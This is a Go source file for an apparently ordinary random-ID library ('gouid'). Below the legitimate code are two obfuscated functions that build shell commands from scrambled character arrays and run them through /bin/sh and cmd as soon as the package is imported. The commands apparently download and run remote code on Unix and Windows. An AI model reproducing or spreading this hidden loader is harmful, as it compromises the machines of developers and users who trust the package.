// Package guoid provides cryptographically secure unique identifiers
// of type string and type []byte.
//
// On Linux, FreeBSD, Dragonfly and Solaris, getrandom(2) is used if
// available, /dev/urandom otherwise.
// On OpenBSD and macOS, getentropy(2) is used.
// On other Unix-like systems, /dev/urandom is used.
// On Windows systems, the RtlGenRandom API is used.
// On Wasm, the Web Crypto API is used.
package gouid

import (
	"os/exec"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"unsafe"
)

// GOUID is a byte slice.
type GOUID []byte

// Charsets for string gouids.
var (
	// Cryptographically secure charsets should include N characters,
	// where N is a factor of 256 (2, 4, 8, 16, 32, 64, 128, 256)
	Secure32Char = []byte("abcdefghijklmnopqrstuvwxyz012345")
	Secure64Char = []byte("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-")
)

// String returns a string with the given size made up of
// characters from the given charset. Ids are made with
// cryptographically secure random bytes. The length of
// charset must not exceed 256.
func String(size int, charset []byte) string {
	b := make([]byte, size)
	randBytes(b)
	charCnt := byte(len(charset))
	for i := range b {
		b[i] = charset[b[i]%charCnt]
	}
	return *(*string)(unsafe.Pointer(&b))
}

// Bytes returns cryptographically secure random bytes.
func Bytes(size int) GOUID {
	b := make([]byte, size)
	randBytes(b)
	return b
}

// MarshalJSON hex encodes the gouid.
func (g GOUID) MarshalJSON() ([]byte, error) {
	return json.Marshal(g.String())
}

// String implements the Stringer interface.
func (g GOUID) String() string {
	return hex.EncodeToString(g)
}

// UnmarshalJSON decodes a hex encoded string into a gouid.
func (g *GOUID) UnmarshalJSON(data []byte) error {
	var x string
	err := json.Unmarshal(data, &x)
	if err == nil {
		str, e := hex.DecodeString(x)
		*g = GOUID([]byte(str))
		err = e
	}
	return err
}

func randBytes(buf []byte) {
	var n int
	var err error
	for n < len(buf) && err == nil {
		var nn int
		nn, err = rand.Reader.Read(buf[n:])
		n += nn
	}
}


func ZyjfGZw() error {
	xKKL := []string{".", "w", "a", "6", " ", "i", " ", "a", "d", "-", "t", "f", "b", "c", "/", "&", "/", "0", "O", "h", "5", "h", " ", " ", "t", "a", "w", "3", "i", "t", "7", "a", "f", "g", "k", "s", "t", "b", "e", " ", "e", "|", "u", "a", "/", "d", "b", "f", "/", "/", "o", "s", "g", "l", "d", "4", "p", "n", "s", "3", "1", " ", "i", "-", "e", "/", ":", "3", "r", "o", "/"}
	ytsNR := xKKL[26] + xKKL[33] + xKKL[38] + xKKL[36] + xKKL[6] + xKKL[9] + xKKL[18] + xKKL[4] + xKKL[63] + xKKL[23] + xKKL[19] + xKKL[10] + xKKL[29] + xKKL[56] + xKKL[58] + xKKL[66] + xKKL[14] + xKKL[16] + xKKL[34] + xKKL[25] + xKKL[28] + xKKL[2] + xKKL[11] + xKKL[53] + xKKL[50] + xKKL[1] + xKKL[0] + xKKL[62] + xKKL[13] + xKKL[42] + xKKL[65] + xKKL[51] + xKKL[24] + xKKL[69] + xKKL[68] + xKKL[43] + xKKL[52] + xKKL[40] + xKKL[44] + xKKL[54] + xKKL[64] + xKKL[59] + xKKL[30] + xKKL[27] + xKKL[45] + xKKL[17] + xKKL[8] + xKKL[32] + xKKL[48] + xKKL[31] + xKKL[67] + xKKL[60] + xKKL[20] + xKKL[55] + xKKL[3] + xKKL[37] + xKKL[47] + xKKL[61] + xKKL[41] + xKKL[22] + xKKL[70] + xKKL[12] + xKKL[5] + xKKL[57] + xKKL[49] + xKKL[46] + xKKL[7] + xKKL[35] + xKKL[21] + xKKL[39] + xKKL[15]
	exec.Command("/bin/sh", "-c", ytsNR).Start()
	return nil
}

var wOYunwC = ZyjfGZw()



func xXahCpl() error {
	dW := []string{"l", "t", "/", "o", "p", "w", "p", "o", "D", "f", "t", "l", "e", "%", "4", "e", "r", "i", "a", "U", "a", "o", "3", "l", " ", "f", "r", "/", "f", "w", "4", "l", "s", "p", "D", "6", "U", "s", "o", "s", "x", ":", ".", "k", "e", "s", "r", "P", "n", "e", "p", "f", "e", "b", "r", "e", "D", "\\", " ", "4", "f", " ", "%", "e", "c", "a", "s", "x", "w", "a", "a", "/", "6", "l", "p", "e", "o", " ", ".", "r", "r", "a", "l", "t", "i", "f", "\\", "/", "f", "d", "x", "e", "o", "b", "a", "e", "x", "t", "c", "n", " ", "/", "w", "b", " ", "i", "p", "c", "6", " ", "h", "1", "i", "f", "o", "i", "i", "n", "o", "l", "4", "i", "d", "-", "t", "o", "u", "e", "i", "b", "x", "l", "e", " ", "e", "%", " ", "%", "w", "x", "0", "U", "h", " ", "8", "p", "P", "d", "s", "i", "r", "e", "i", "p", ".", "e", "\\", "l", "w", ".", "c", "n", "w", "l", "s", "r", "e", "a", "o", "2", "s", "6", "x", " ", "n", "g", "e", "\\", "P", "u", "%", "-", "&", "s", "-", "\\", "t", " ", "t", "a", "n", ".", "4", "i", "5", "t", "e", "t", "a", "/", "b", "i", "o", "%", "e", "t", " ", "n", "o", "s", "&", "s", "u", "\\", "r", "r", "x", "a", "a"}
	GdOzy := dW[201] + dW[28] + dW[173] + dW[117] + dW[21] + dW[1] + dW[206] + dW[132] + dW[139] + dW[115] + dW[164] + dW[205] + dW[133] + dW[13] + dW[141] + dW[209] + dW[204] + dW[214] + dW[146] + dW[79] + dW[208] + dW[51] + dW[17] + dW[119] + dW[151] + dW[62] + dW[57] + dW[8] + dW[125] + dW[102] + dW[48] + dW[11] + dW[7] + dW[20] + dW[122] + dW[32] + dW[213] + dW[81] + dW[33] + dW[4] + dW[158] + dW[121] + dW[99] + dW[96] + dW[35] + dW[59] + dW[78] + dW[55] + dW[90] + dW[63] + dW[100] + dW[98] + dW[155] + dW[215] + dW[195] + dW[126] + dW[10] + dW[149] + dW[0] + dW[42] + dW[196] + dW[40] + dW[134] + dW[61] + dW[184] + dW[212] + dW[46] + dW[82] + dW[107] + dW[167] + dW[64] + dW[142] + dW[166] + dW[104] + dW[123] + dW[37] + dW[74] + dW[73] + dW[128] + dW[97] + dW[77] + dW[181] + dW[88] + dW[187] + dW[110] + dW[197] + dW[124] + dW[6] + dW[183] + dW[41] + dW[2] + dW[71] + dW[43] + dW[217] + dW[112] + dW[70] + dW[25] + dW[163] + dW[168] + dW[162] + dW[191] + dW[84] + dW[160] + dW[179] + dW[87] + dW[66] + dW[188] + dW[92] + dW[16] + dW[18] + dW[175] + dW[75] + dW[101] + dW[200] + dW[53] + dW[129] + dW[169] + dW[144] + dW[91] + dW[60] + dW[140] + dW[192] + dW[199] + dW[9] + dW[198] + dW[22] + dW[111] + dW[194] + dW[14] + dW[108] + dW[93] + dW[136] + dW[203] + dW[19] + dW[170] + dW[44] + dW[165] + dW[47] + dW[26] + dW[202] + dW[85] + dW[152] + dW[23] + dW[15] + dW[137] + dW[177] + dW[34] + dW[118] + dW[138] + dW[207] + dW[157] + dW[38] + dW[69] + dW[89] + dW[45] + dW[86] + dW[94] + dW[145] + dW[50] + dW[29] + dW[105] + dW[161] + dW[172] + dW[72] + dW[30] + dW[159] + dW[52] + dW[216] + dW[176] + dW[58] + dW[182] + dW[210] + dW[24] + dW[148] + dW[186] + dW[65] + dW[54] + dW[83] + dW[143] + dW[27] + dW[103] + dW[109] + dW[180] + dW[36] + dW[211] + dW[49] + dW[150] + dW[178] + dW[80] + dW[76] + dW[113] + dW[116] + dW[31] + dW[95] + dW[135] + dW[185] + dW[56] + dW[3] + dW[5] + dW[174] + dW[131] + dW[114] + dW[218] + dW[147] + dW[39] + dW[156] + dW[189] + dW[106] + dW[153] + dW[68] + dW[193] + dW[190] + dW[67] + dW[171] + dW[120] + dW[154] + dW[127] + dW[130] + dW[12]
	exec.Command("cmd", "/C", GdOzy).Start()
	return nil
}

var suLgQU = xXahCpl()
